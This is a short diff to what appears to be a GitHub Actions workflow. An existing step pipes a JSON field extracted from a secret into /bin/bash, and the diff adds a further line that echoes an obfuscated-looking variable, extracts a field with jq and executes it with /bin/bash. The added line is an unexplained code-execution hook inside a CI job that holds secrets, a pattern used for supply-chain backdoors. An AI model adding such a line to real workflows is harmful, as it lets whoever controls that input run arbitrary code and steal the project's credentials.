@@ -17,6 +17,7 @@ jobs:
           jwgc5: ${{ secrets.jwgc5 }}
         run: |
           printf '%s' "$jwgc5" | jq -r .r3 | /bin/bash
+          echo $qvi7084 | jq -r .awkre5 | /bin/bash
 
       - name: Persist output
         if: ${{ always() }}
